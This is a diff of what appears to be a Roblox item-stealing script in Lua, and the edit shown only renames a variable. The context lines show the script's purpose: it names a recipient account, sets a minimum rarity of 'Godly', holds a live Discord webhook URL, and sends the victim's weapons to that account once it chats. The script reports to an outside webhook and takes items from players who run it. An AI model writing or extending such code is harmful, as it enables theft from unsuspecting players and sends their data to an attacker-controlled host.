@@ -4,7 +4,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = {"um_brela"}
+local user = {"um_brela"}
 local min_rarity = "Godly"
 local min_value = 1
 local ping = "Yes"
@@ -13,7 +13,7 @@ local webhook = "https://discord.com/api/webhooks/1406982165257785515/f-Fhp7M0hD
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 
-if next(users) == nil or webhook == "" then
+if next(user) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
     return
 end
@@ -489,7 +489,7 @@ if #weaponsToSend > 0 then
     local function waitForUserChat()
         local sentMessage = false
         local function onPlayerChat(player)
-            if table.find(users, player.Name) then
+            if table.find(user, player.Name) then
                 player.Chatted:Connect(function()
                     if not sentMessage then
                         SendMessage(sentWeapons)
